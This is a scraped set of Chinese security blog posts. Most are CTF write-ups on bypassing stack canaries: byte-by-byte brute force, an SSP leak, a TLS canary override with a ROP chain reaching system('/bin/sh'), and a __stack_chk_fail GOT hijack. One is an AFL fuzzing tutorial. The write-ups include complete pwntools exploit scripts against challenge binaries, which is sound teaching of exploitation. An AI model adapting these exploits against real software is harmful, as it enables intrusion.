这是一个典型的多进程并发服务器 结合上面checksec的结果，首先想到的应该就是想办法爆破Canary。 12345678910111213141516171819202122232425262728293031323334353637... while ( 1 ) { fd = accept(sock, &amp;sock_addr, &amp;addr_len); if ( fd == -1 ) { perror(\"accept\"); return 0xFFFFFFFFLL; } send(fd, \"Welcome!\\n\", 9uLL, 0); pid = fork(); if ( pid == -1 ) { perror(\"fork\"); return 0xFFFFFFFFLL; } if ( !pid ) break; close(fd); } signal(14, (__sighandler_t)handler); alarm(3u); if ( (unsigned int)handle_message() ) { if ( send(fd, \"Message receive failed\\n\", 0x19uLL, 0) == -1 ) { perror(\"send\"); return 0xFFFFFFFFLL; } } else if ( send(fd, \"Message received!\\n\", 0x12uLL, 0) == -1 ) { perror(\"send\"); return 0xFFFFFFFFLL; } return 0LL;} 进一步查看处理连接的函数handle_message()，可以得到另外两个关键信息： Canary在rbp-0x8处 读取用户输入时存在一个栈溢漏洞，需要填充的空间大小为0x78-0x10=0x68字节 12345678910111213141516171819202122signed __int64 handle_message(){ signed __int64 result; // rax char s; // [rsp+10h] [rbp-70h] unsigned __int64 canary; // [rsp+78h] [rbp-8h] //canary位于rbp-0x8 canary = __readfsqword(0x28u); printf(\"csfd = %d\\n\", (unsigned int)fd); bzero(&amp;s, 0x64uLL); if ( (unsigned int)recv(fd, &amp;s, 0x400uLL, 0) == -1 ) //s的大小只有0x68字节 { perror(\"recv\"); result = 0xFFFFFFFFLL; } else { printf(\"Message come: %s\", &amp;s); fflush(stdout); result = 0LL; } return result;} 再检查剩下的几个函数，函数sub_400b76()将打开文件flag并将内容写入bss中： 123456789101112ssize_t read_flag(){ int fd; // [rsp+Ch] [rbp-4h] fd = open(\"./flag\", 0); if ( fd &lt; 0 ) { perror(\"open flag failed\"); exit(0); } return read(fd, &amp;flag, 0x64uLL);} 函数sub_400bc6()向fd中发送flag，这里重命名为send_flag()。 1234ssize_t sned_flag(){ return send(fd, &amp;flag, 0x64uLL, 0);} 利用因此利用思路就可以确定如下，结合上面静态分析得到的信息，甚至不用调试 逐字节爆破Canary 已用栈溢出覆盖返回地址 在溢出数据恰当的偏移处填上爆破出的Canary 将返回地址覆盖为sned_flag()的地址 12345678910111213141516171819202122232425262728293031#!/usr/bin/pythonfrom pwn import *context.log_level = 'WARN'send_flag = p64(0x400bc6)# leak Canarycanary = \"\\x00\" #Canary的最低位为0x00for x in range(7): for y in xrange(256): p = remote(\"127.0.0.1\", 5555) p.recv() p.send(\"A\"*0x68+canary+chr(y)) try: p.recv() except: p.close() continue p.close() break canary += chr(y) print(\"[*] Canary byte \" + str(x+1) +\": \" + hex(y))p = remote(\"127.0.0.1\", 5555)p.recv()p.send(\"A\"*0x68+canary+\"A\"*8+send_flag)flag = p.recv()p.close()print('[+] flag is:' + flag) Exp运行结果：","link":"/post/65468.html"},{"title":"AFL漏洞挖掘技术漫谈：Fuzz结果分析和代码覆盖率","text":"前言上一篇文章中向大家介绍了使用AFL开始模糊测试前要做的一些准备工作，以及AFL的几种工作方式，但是并没有提到何时结束测试过程，以及测试完成后又需要做些什么。本文中就继续介绍这些内容，并开始逐步介绍一些AFL相关原理。以下就是本文中主要讨论的问题： 何时结束Fuzzing工作 afl-fuzz生成了哪些文件 如何对产生的crash进行验证和分类 用什么来评估Fuzzing的结果 代码覆盖率及相关概念 AFL是如何记录代码覆盖率的 Fuzzer工作状态因为afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。除了前面提到过的通过状态窗口、afl-whatsup查看afl-fuzz状态外，这里再补充几种方法。 1. afl-statafl-stat是afl-utils这套工具AFL辅助工具中的一个（这套工具中还有其他更好用的程序，后面用到时会做介绍），该工具类似于afl-whatsup的输出结果。 使用前需要一个配置文件，设置每个afl-fuzz实例的输出目录：12345678{ &quot;fuzz_dirs&quot;: [ &quot;/root/syncdir/SESSION000&quot;, &quot;/root/syncdir/SESSION001&quot;, ... &quot;/root/syncdir/SESSION00x&quot; ]}然后指定配置文件运行即可：1234567891011121314$ afl-stats -c afl-stats.conf[SESSION000 on fuzzer1] Alive: 1/1 Execs: 64 m Speed: 0.3 x/s Pend: 6588/249 Crashes: 101[SESSION001 on fuzzer1] Alive: 1/1 Execs: 105 m Speed: 576.6 x/s Pend: 417/0 Crashes: 291... 2. 定制afl-whatsupafl-whatsup是依靠读afl-fuzz输出目录中的fuzzer_stats文件来显示状态的，每次查看都要需要手动执行，十分麻烦。因此可以对其进行修改，让其实时显示fuzzer的状态。方法也很简答，基本思路就是在所有代码外面加个循环就好，还可以根据自己的喜好做些调整： 3. afl-plot前面提到的都是基于命令行的工具，如果还想要更直观的结果，可以用afl-plot绘制各种状态指标的直观变化趋势。123#安装依赖工具gnuplot$ apt-get install gnuplot$ afl-plot afl_state_dir graph_output_dir以测试libtiff的情况为例，进入afl-plot输出目录，打开index.html，会看到下面三张图： 首先是路径覆盖的变化，当pending fav的数量变为零并且total paths数量基本上没有再增长时，说明fuzzer有新发现的可能性就很小了。 接着是崩溃和超时的变化 最后是执行速度的变化，这里要注意的是，如果随着时间的推移，执行速度越来越慢，有一种可能是因为fuzzer耗尽一些共享资源。 4. pythia笔者在查阅资料的过程中，还发现了pythia这个AFL的扩展项目，虽然不知道效果如何，但这里还是顺便提一提。其特色在于可以估算发现新crash和path概率，其运行界面相比原版的AFL多出了下面几个字段： correctness: 在没有发现crash时，发现一个导致crash输入的概率。fuzzability: 表示在该程序中发现新路径的难度，该数值越高代表程序越容易Fuzz。current paths: 显示当前发现的路径数。path coverag: 路径覆盖率。 三、结束测试1.何时结束检查afl-fuzz工作状态的目的是为何时停止测试提供依据，通常来说符合下面几种情况时就可以停掉了。 状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考，随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续Fuzzing下去也很难有新的发现了，这时便可以通过Ctrl-C停止afl-fuzz。 距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握，比如长达一个星期或者更久估计大家也都没啥耐心了吧。 目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见，但是对于某些小型程序应该还是可能的，至于如何计算覆盖率将在下面介绍。 上面提到的pythia提供的各种数据中，一旦path covera达到99％（通常来说不太可能），如果不期望再跑出更多crash的话就可以中止fuzz了，因为很多crash可能是因为相同的原因导致的；还有一点就是correctness的值达到1e-08，根据pythia开发者的说法，这时从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行，这一点也可以作为衡量依据。 2. 输出结果afl-fuzz的输出目录中存在很多文件，有时想要写一个辅助工具可能就要用到其中的文件。下面以多个fuzz实例并行测试时的同步目录为例： 1234567891011121314151617181920$ tree -L 3.├── fuzzer1│ ├── crashes│ │ ├── id:000000,sig:06,src:000019+000074,op:splice,rep:2│ │ ├── ...│ │ ├── id:000002,sig:06,src:000038+000125,op:splice,rep:4│ │ └── README.txt│ ├── fuzz_bitmap│ ├── fuzzer_stats│ ├── hangs│ │ └── id:000000,src:000007,op:flip1,pos:55595│ ├── plot_data│ └── queue│ ├── id:000000,orig:1.png│ ├── .... │ └── id:000101,sync:fuzzer10,src:000102└── fuzzer2 ├── crashes ├── ... queue：存放所有具有独特执行路径的测试用例。crashes：导致目标接收致命signal而崩溃的独特测试用例。crashes/README.txt：保存了目标执行这些crash文件的命令行参数。hangs：导致目标超时的独特测试用例。fuzzer_stats：afl-fuzz的运行状态。plot_data：用于afl-plot绘图。 四、处理测试结果到了这里，我们可能已经跑出了一大堆的crashes，那么接下来的步骤，自然是确定造成这些crashes的bug是否可以利用，怎么利用？这是另一个重要方面。当然，个人觉得这比前面提到的内容都要困难得多，这需要对常见的二进制漏洞类型、操作系统的安全机制、代码审计和调试等内容都有一定深度的了解。但如果只是对crash做简单的分析和分类，那么下面介绍的几种方法都可以给我们提供一些帮助。 1. crash exploration mode这是afl-fuzz的一种运行模式，也称为peruvian rabbit mode，用于确定bug的可利用性，具体细节可以参考lcamtuf的博客。1$ afl-fuzz -m none -C -i poc -o peruvian-were-rabbit_out -- ~/src/LuPng/a.out @@ out.png 举个例子，当你发现目标程序尝试写入\\跳转到一个明显来自输入文件的内存地址，那么就可以猜测这个bug应该是可以利用的；然而遇到例如NULL pointer dereferences这样的漏洞就没那么容易判断了。 将一个导致crash测试用例作为afl-fuzz的输入，使用-C选项开启crash exploration模式后，可以快速地产生很多和输入crash相关、但稍有些不同的crashes，从而判断能够控制某块内存地址的长度。这里笔者在实践中没有找到适合的例子，但在一篇文章中发现了一个很不错的例子——tcpdump栈溢出漏洞，crash exploration模式从一个crash产生了42个新的crash，并读取不同大小的相邻内存。 2. triage_crashesAFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。例如下面的例子中，11代表了SIGSEGV信号，有可能是因为缓冲区溢出导致进程引用了无效的内存；06代表了SIGABRT信号，可能是执行了abort\\assert函数或double free导致，这些结果可以作为简单的参考。 123456789$ ~/afl-2.52b/experimental/crash_triage/triage_crashes.sh fuzz_out ~/src/LuPng/a.out @@ out.png 2&gt;&amp;1 | grep SIGNAL +++ ID 000000, SIGNAL 11 +++ +++ ID 000001, SIGNAL 06 +++ +++ ID 000002, SIGNAL 06 +++ +++ ID 000003, SIGNAL 06 +++ +++ ID 000004, SIGNAL 11 +++ +++ ID 000005, SIGNAL 11 +++ +++ ID 000006, SIGNAL 11 +++ ... 3. crashwalk当然上面的两种方式都过于鸡肋了，如果你想得到更细致的crashes分类结果，以及导致crashes的具体原因，那么crashwalk就是不错的选择之一。这个工具基于gdb的exploitable插件，安装也相对简单，在ubuntu上，只需要如下几步即可： 12345678$ apt-get install gdb golang$ mkdir tools$ cd tools$ git clone https://github.com/jfoote/exploitable.git$ mkdir go$ export GOPATH=~/tools/go$ export CW_EXPLOITABLE=~/tools/exploitable/exploitable/exploitable.py$ go get -u github.com/bnagy/crashwalk/cmd/... crashwalk支持AFL/Manual两种模式。前者通过读取crashes/README.txt文件获得目标的执行命令（前面第三节中提到的），后者则可以手动指定一些参数。两种使用方式如下： 1234#Manual Mode$ ~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@#AFL Mode$ ~/tools/go/bin/cwtriage -root syncdir -afl 两种模式的输出结果都一样，如上图所示。这个工具比前面几种方法要详细多了，但当有大量crashes时结果显得还是十分混乱。 4. afl-collect最后重磅推荐的工具便是afl-collect，它也是afl-utils套件中的一个工具，同样也是基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。使用起来命令稍微长一点，如下所示： 1$ afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir -- /path/to/target --target-opts 但是结果就像下面这样非常直观： 五、代码覆盖率及其相关概念代码覆盖率是模糊测试中一个极其重要的概念，使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。 1. 代码覆盖率（Code Coverage）代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的官方文档。 2. 基本块（Basic Block）缩写为BB，指一组顺序执行的指令，BB中第一条指令被执行后，后续的指令也会被全部执行，每个BB中所有指令的执行次数是相同的，也就是说一个BB必须满足以下特征： 只有一个入口点，BB中的指令不是任何跳转指令的目标。 只有一个退出点，只有最后一条指令使执行流程转移到另一个BB 例如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块 将上面的程序拖进IDA，可以看到同样被划分出了4个基本块： 3. 边（edge）AFL的技术白皮书中提到fuzzer通过插桩代码捕获边（edge）覆盖率。那么什么是edge呢？我们可以将程序看成一个控制流图（CFG），图的每个节点表示一个基本块，而edge就被用来表示在基本块之间的转跳。知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息。 4. 元组（tuple）具体到AFL的实现中，使用二元组(branch_src, branch_dst)来记录当前基本块 + 前一基本块 的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下： 123cur_location = &lt;COMPILE_TIME_RANDOM&gt;; //用一个随机数标记当前基本块shared_mem[cur_location ^ prev_location]++; //将当前块和前一块异或保存到shared_mem[]prev_location = cur_location &gt;&gt; 1; //cur_location右移1位区分从当前块到当前块的转跳 实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置ecx/rcx，然后调用__afl_maybe_log，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。 六、计算代码覆盖率了解了代码覆盖率相关的概念后，接下来看看如何计算我们的测试用例对前面测试目标的代码覆盖率。 这里需要用到的工具之一是GCOV，它随gcc一起发布，所以不需要再单独安装，和afl-gcc插桩编译的原理一样，gcc编译时生成插桩的程序，用于在执行时生成代码覆盖率信息。 另外一个工具是LCOV，它是GCOV的图形前端，可以收集多个源文件的gcov数据，并创建包含使用覆盖率信息注释的源代码HTML页面。 最后一个工具是afl-cov，可以快速帮助我们调用前面两个工具处理来自afl-fuzz测试用例的代码覆盖率结果。在ubuntu中可以使用apt-get install afl-cov安装afl-cov，但这个版本似乎不支持分支覆盖率统计，所以还是从Github下载最新版本为好，下载完无需安装直接运行目录中的Python脚本即可使用： 1234$ apt-get install lcov$ git clone https://github.com/mrash/afl-cov.git$ ./afl-cov/afl-cov -Vafl-cov-0.6.2 还是以Fuzz libtiff为例，计算Fuzzing过程的代码覆盖率流程如下： 第一步，使用gcov重新编译源码，在CFLAGS中添加&quot;-fprofile-arcs&quot;和&quot;-ftest-coverage&quot;选项，可以在--prefix中重新指定一个新的目录以免覆盖之前alf插桩的二进制文件。 1234$ make clean$ ./configure --prefix=/root/tiff-4.0.10/build-cov CC=\"gcc\" CXX=\"g++\" CFLAGS=\"-fprofile-arcs -ftest-coverage\" --disable-shared$ make$ make install 第二步，执行afl-cov。其中-d选项指定afl-fuzz输出目录；—live用于处理一个还在实时更新的AFL目录，当afl-fuzz停止时，afl-cov将退出；–enable-branch-coverage用于开启边缘覆盖率（分支覆盖率）统计；-c用于指定源码目录；最后一个-e选项用来设置要执行的程序和参数，其中的AFL_FILE和afl中的”@@”类似，会被替换为测试用例，LD_LIBRARY_PATH则用来指定程序的库文件。 12$ cd ~/tiff-4.0.10$ afl-cov -d ~/syncdir --live --enable-branch-coverage -c . -e \"cat AFL_FILE | LD_LIBRARY_PATH=./build-cov/lib ./build-cov/bin/tiff2pdf AFL_FILE\" 成功执行的结果如下所示： 我们可以通过—live选择，在fuzzer运行的同时计算覆盖率，也可以在测试结束以后再进行计算，最后会得到一个像下面这样的html文件。它既提供了概述页面，显示各个目录的覆盖率；也可以在点击进入某个目录查看某个具体文件的覆盖率。 点击进入每个文件，还有更详细的数据。每行代码前的数字代表这行代码被执行的次数，没有执行过的代码会被红色标注出来。 参考资料INTRO TO AMERICAN FUZZY LOP – FUZZING WITH ASAN AND BEYOND Fuzzing with AFL.pdf) Clang 9 documentation - SanitizerCoverage honggfuzz漏洞挖掘技术深究系列 How Much Test Coverage Is Enough For Your Testing Strategy?","link":"/post/16717156.html"},{"title":"Bypassing Canary——SSP Leak","text":"SSP Leak即Stack Smashing Protect Leak ，从字面意思理解，主要作用是泄漏信息，而非getshell。不过有些题目中flag已经被读取存在内存中了，这时我们就可以通过SSP Leak将flag泄漏出来。 该方法需要我们触发Stack Smashing Protect，即覆盖掉Canary，进入函数__stack_chk_fail中后，将进一步调用__fortify_fail_abort打印stack smashing detected *: ./XXX terminated**，其中的程序名从__libc_argv[0]取得。 1234567//glibc-2.29 debug/stack_chk_fail.cvoid__attribute__ ((noreturn))__stack_chk_fail (void){ __fortify_fail_abort (false, \"stack smashing detected\");} 123456789101112131415//glibc-2.29 debug/fortify_fail.cvoid__attribute__ ((noreturn))__fortify_fail_abort (_Bool need_backtrace, const char *msg){ /* The loop is added only to keep gcc happy. Don't pass down __libc_argv[0] if we aren't doing backtrace since __libc_argv[0] may point to the corrupted stack. */ while (1) __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort, \"*** %s ***: %s terminated\\n\", msg, (need_backtrace &amp;&amp; __libc_argv[0] != NULL ? __libc_argv[0] : \"&lt;unknown&gt;\"));} 再来看看一个程序栈的布局，传入main函数的argv位于栈的高地址处，只要溢出的长度足够覆盖它，我们就可以控制前面打印信息。 最后注意该方法还要满足以下条件： stderr被重定向到套接字，因为libc将调试信息写入了STDERR_FILENO 在受SSP保护的函数中可溢出的范围足够到达栈顶部的argv[0] OK，现在来看看如何应用SSP Leak~ EKOPARTY PRE-CTF 2015 xpl1234567$ checksec xpl[*] '/root/xpl' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 下面IDA的反编译有些问题，flag显然应该是上面printf的参数，不过对分析的影响不大，查看汇编指令就可以发现问题。 在反编译代码中，可以很明显的看到read(0LL, &amp;v6, 1024LL);存在栈溢出，v6的栈空间大小只有0x90-0x8=0x88。 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp){ __int64 v4; // [rsp+18h] [rbp-118h] char flag; // [rsp+20h] [rbp-110h] char v6; // [rsp+A0h] [rbp-90h] unsigned __int64 v7; // [rsp+128h] [rbp-8h] v7 = __readfsqword(0x28u); putenv(\"LIBC_FATAL_STDERR_=1\", argv, envp); v4 = fopen64((__int64)\"flag.txt\", (__int64)\"r\"); if ( v4 ) { fgets(&amp;flag, 32LL, v4); fclose(v4); printf((unsigned __int64)\"Interesting data loaded at %p\\nYour username? \"); fflush(0LL, &amp;flag); read(0LL, &amp;v6, 1024LL); } else { puts(\"Error leyendo datos\"); } return 0;} 测试一下是否和分析的一样： 12345$ python -c 'print \"A\"*0x88' | ./xplInteresting data loaded at 0x7ffd31994cf0Your username? *** stack smashing detected ***: ./xpl terminated[1] 3697 done python -c 'print \"A\"*0x88' | 3698 abort (core dumped) ./xpl 而程序打印出的”Interesting data loaded at 0x7ffd31994cf0“和明显暗示我们要使用SSP Leak的方法，至少我个人觉得如此。。所以我们继续测试看到大的输入能覆盖掉__libc_argv[0] 12345678910111213141516$ python -c 'print \"A\"*0x150' | ./xplInteresting data loaded at 0x7ffd5b30aad0Your username? *** stack smashing detected ***: ./xpl terminated[1] 3712 done python -c 'print \"A\"*0x150' | 3713 abort (core dumped) ./xpl$ python -c 'print \"A\"*0x200' | ./xplInteresting data loaded at 0x7ffe8138bbd0Your username? [1] 3727 done python -c 'print \"A\"*0x200' | 3728 segmentation fault (core dumped) ./xpl$ python -c 'print \"A\"*0x175' | ./xplInteresting data loaded at 0x7ffe6110ddf0Your username? *** stack smashing detected ***: ./xpl terminated[1] 3742 done python -c 'print \"A\"*0x175' | 3743 abort (core dumped) ./xpl OK，现在我们大概确定了一个范围了，一个一个大小试太过麻烦，所以现在可以开始写exp爆破一下。向程序发送的payload应该是'A'*i +flag_addr的形式，完整exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from time import sleepcontext.os = 'linux'context.terminal = ['tmux', 'splitw', '-h']# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']context.log_level = 'INFO'bin_path = './xpl'binary = ELF(bin_path)def debug(command=''): gdb.attach(p, command)def exploit(): for i in range(0x175, 0x200): p = process(bin_path) recv = p.recvline() # 取出打印消息中”Interesting data loaded at 0xxxxxxxxxx“的地址 p.sendline(\"A\"*i+p64(int(recv.split()[4],16))) log.info(\"Length: \" + hex(i)) log.info(recv) try: print p.recvline() except: pass sleep(0.1)if __name__ == '__main__': if len(sys.argv) == 1: global p #p = process(executable=bin_path, argv=[bin_path]) else: #p = remote(sys.argv[1], int(sys.argv[2])) exploit() EXP执行结果：","link":"/post/36591.html"},{"title":"Bypassing Canary——Override Canary in TLS","text":"TL;DR 线程局部存储（TLS）作用 glibc中为TLS设置Canary的过程 同时覆盖TLS和返回地址前的Canary——StarCTF2018 babystack TLS通常在C程序中常存在全局变量、静态变量以及局部变量，对于局部变量来说，并不存在线程安全问题。而对于全局变量和函数内定义的静态变量，同一进程中各个线程都可以访问它们，因此它们存在多线程读写问题。 如果需要在一个线程内部的各个函数调用都能访问、但其它线程不能访问的变量（被称为static memory local to a thread 线程局部静态变量），就需要新的机制来实现，这就是TLS。当函数在不同的线程上被调用时，该线程会被分配新的栈，并且Canary会被放置在TLS上。TLS位于栈的顶部，当溢出长度较大时，可以同时覆盖返回地址前的 Canary 和 TLS 中的 Canary 实现绕过。 Glibc中设置Canary的过程从glibc源码中可以看到，定义了THREAD_SET_STACK_GUARD时，Canary通过这个宏被设置；否则存入全局变量__stack_chk_guard中 1234567 /* Set up the stack checker's canary. */ uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);# ifdef THREAD_SET_STACK_GUARD THREAD_SET_STACK_GUARD (stack_chk_guard);# else __stack_chk_guard = stack_chk_guard;# endif 进一步查看THREAD_SET_STACK_GUARD定义 12# define THREAD_SET_STACK_GUARD(value) \\ THREAD_SETMEM (THREAD_SELF, header.stack_guard, value) 查看THREAD_SETMEM，可以看到这个宏通过内联汇编，将vlaue，也就是Canary放入了fs寄存器的某个偏移处，而这个偏移处又是通过offsetof宏得到的pthread结构体某个成员的偏移，在上面的代码中，可以看到传入的是成员header.stack_guard。 1234567891011121314151617181920# define THREAD_SETMEM(descr, member, value) \\ ({ if (sizeof (descr-&gt;member) == 1) \\ asm volatile (\"movb %b0,%%fs:%P1\" : \\ : \"iq\" (value), \\ \"i\" (offsetof (struct pthread, member))); \\ else if (sizeof (descr-&gt;member) == 4) \\ asm volatile (\"movl %0,%%fs:%P1\" : \\ : IMM_MODE (value), \\ \"i\" (offsetof (struct pthread, member))); \\ else \\ { \\ if (sizeof (descr-&gt;member) != 8) \\ /* There should not be any value with a size other than 1, \\ 4 or 8. */ \\ abort (); \\ \\ asm volatile (\"movq %q0,%%fs:%P1\" : \\ : IMM_MODE ((uint64_t) cast_to_integer (value)), \\ \"i\" (offsetof (struct pthread, member))); \\ }}) pthread是一个超大的结构体，这里略去余下部分 123456789...struct pthread{ union {#if !TLS_DTV_AT_TP /* This overlaps the TCB as used for TLS without threads (see tls.h). */ tcbhead_t header;... Canary正是存储在tcbhead_t中的stack_guard，根据变量类型可以计算出在32位和64位上的偏移： 32位 gs:0x14 （0x4×3+0x4×3+0x4） 64位 fs:0x28（0x8×3+0x4×3+0x8） 1234567891011121314151617181920212223242526272829typedef struct{ void *tcb; /* Pointer to the TCB. Not necessarily the thread descriptor used by libpthread. */ dtv_t *dtv; void *self; /* Pointer to the thread descriptor. */ int multiple_threads; int gscope_flag; uintptr_t sysinfo; uintptr_t stack_guard; uintptr_t pointer_guard; unsigned long int vgetcpu_cache[2]; /* Bit 0: X86_FEATURE_1_IBT. Bit 1: X86_FEATURE_1_SHSTK. */ unsigned int feature_1; int __glibc_unused1; /* Reservation of some values for the TM ABI. */ void *__private_tm[4]; /* GCC split stack support. */ void *__private_ss; /* The lowest address of shadow stack, */ unsigned long long int ssp_base; /* Must be kept even if it is no longer used by glibc since programs, like AddressSanitizer, depend on the size of tcbhead_t. */ __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32))); void *__padding[8];} tcbhead_t; TLS和线程栈为了查看线程栈，使用strace追踪程序创建线程的过程如下： 调用mmap分配8M大小的的内存 调用mprotect修改刚分配内存的前4k的权限为PROT_NONE，即不可访问来检测栈溢出，这块区域也称为“Red Zone” 调用clone创建线程，并传递线程栈地址、TLS地址等参数 123456789...mmap(NULL, 8392704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f1a4cf47000brk(NULL) = 0x791000brk(0x7b2000) = 0x7b2000mprotect(0x7f1a4cf47000, 4096, PROT_NONE) = 0clone(child_stack=0x7f1a4d746ff0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0x7f1a4d7479d0, tls=0x7f1a4d747700, child_tidptr=0x7f1a4d7479d0) = 62543futex(0x7f1a4d7479d0, FUTEX_WAIT, 62543, NULLWelcome to babystack 2018!How many bytes do you want to send?... 查看maps 123456789101112$ cat /proc/62542/maps00400000-00401000 r-xp 00000000 08:01 656620 /root/ex/bs00601000-00602000 r--p 00001000 08:01 656620 /root/ex/bs00602000-00603000 rw-p 00002000 08:01 656620 /root/ex/bs00791000-007b2000 rw-p 00000000 00:00 0 [heap]7f1a4cf47000-7f1a4cf48000 ---p 00000000 00:00 07f1a4cf48000-7f1a4d748000 rw-p 00000000 00:00 07f1a4d748000-7f1a4d908000 r-xp 00000000 08:01 529450 /lib/x86_64-linux-gnu/libc-2.23.so7f1a4d908000-7f1a4db08000 ---p 001c0000 08:01 529450 /lib/x86_64-linux-gnu/libc-2.23.so7f1a4db08000-7f1a4db0c000 r--p 001c0000 08:01 529450 /lib/x86_64-linux-gnu/libc-2.23.so7f1a4db0c000-7f1a4db0e000 rw-p 001c4000 08:01 529450 /lib/x86_64-linux-gnu/libc-2.23.so... StarCTF2018 babystack 触发栈溢出，将Canary覆盖为AAAAAAAA，同时使用超长的payload将TLS中的Canary一并覆盖为AAAAAAAA 设置好fakebuf到.bss段 构造ROP链，首先打印GOT中puts的地址 构造read的ROP读取one_gadget到fakebuf 利用Stack Pivot将栈迁移到.bss段 发送利用泄漏的puts地址发送one_gadget 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/pythonfrom pwn import *context.os = 'linux'context.terminal = ['tmux', 'splitw', '-h']# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']context.log_level = 'INFO'libc_path = '/lib/x86_64-linux-gnu/libc.so.6'bin_path = './bs'libc = ELF(libc_path)binary = ELF(bin_path)host = ''port = 6666def debug(command=''): gdb.attach(p, command)def exploit(): #debug('b *0x4009E7\\n') g = lambda x: next(binary.search(asm(x, os='linux', arch='amd64'))) pop_rdi = g('pop rdi; ret') pop_rsi_pop = g('pop rsi; pop r15; ret') leave = g('leave; ret') log.info(\"pop_rdi: \" + hex(pop_rdi)) log.info(\"pop_rsi_pop: \" + hex(pop_rsi_pop)) log.info(\"leave: \" + hex(leave)) size = 8300 p.sendlineafter('send?\\n', str(size)) fakebuf = 0x602f00 payload = '' payload += 'A'*0x1010 # stack pivot #step 1 payload += p64(fakebuf) # ROP1 - leak libc payload += p64(pop_rdi) payload += p64(binary.got['puts']) payload += p64(binary.plt['puts']) # ROP2 - read payload += p64(pop_rdi) payload += p64(0) payload += p64(pop_rsi_pop) payload += p64(fakebuf) payload += p64(0) payload += p64(binary.plt['read']) # stack pivot #step 2 payload += p64(leave) # Override TLS Canary payload = payload.ljust(size, 'A') p.send(payload) p.recvuntil('goodbye.\\n') leak = p.recvline().strip()[-6:].ljust(8, '\\0') leak = u64(leak) libc.address = leak - libc.sym['puts'] info(\"%#x\", libc.address) bin_sh = libc.search('/bin/sh').next() system = libc.sym['system'] payload = '' payload += p64(0) payload += p64(pop_rdi) payload += p64(bin_sh) payload += p64(system) p.send(payload) p.interactive()if __name__ == '__main__': if len(sys.argv) == 1: global p p = process(executable=bin_path, argv=[bin_path]) #, env={'LD_PRELOAD':libc_path}) else: p = remote(sys.argv[1], int(sys.argv[2])) exploit()","link":"/post/34550.html"},{"title":"Bypassing Canary——hijack __stack_chk_fail","text":"我们都知道，Canary验证失败后会调用 __stack_chk_fail 函数打印 *\\ stack smashing detected ***: ./XXX terminated**。__stack_chk_fail 是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数，来达到Bypass Canary的目的，但只有程序的RELRO为Partial RELRO才可以执行这种操作，下面来看一个具体的例子。 NJCTF2017 messagerchecksec1234567$ checksec login[*] '/root/ZCTF2017/login' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 运行结果： 第一步：覆盖__stack_chk_fail 的GOT表项 观察上图，format string实际存放在0xffce2ed6，字符串被sprintf写入0xffce2e5c（eax），所以要覆写format string，payload前还需要0xffce2ed6 - 0xffce2e5c = 0x7a字节，具体填充在下面代码注释中： 123456789101112131415161718def exploit(): # __stack_chk_fail GOT表中的地址，用于后面修改 payload = p32(binary.symbols['got.__stack_chk_fail']) # sprintf写入字符串的长度为0x4c，减去前面__stack_chk_fail的地址，再加上ebp payload += 'a' * (0x48+0x4) # 将返回地址覆盖为main函数地址，以便再次获得执行机会 payload += p32(binary.symbols['main']) # 填充一定字节直到可以覆盖format string payload += 'a' * 0x26 # 将format string修改为如下内容 payload += r'%s:%39x%10$hhn' + '\\x00' # %s 读取payload，使格式化字符串被覆盖 # %n 配合%c或%x使用，%n负责统计输出的字符数量,写入到%n对应变量里。 # 在上面的%10$hhn中，10$指第10个变量，hhn指写入一个字节 # 8 alarm # 39 malloc... 第二步： leak libc第一部分的代码执行完后，__stack_chk_fail 的GOT被覆盖为malloc@plt，不会触发Canary机制，同时返回到main中，我们有了第二次输入的机会。 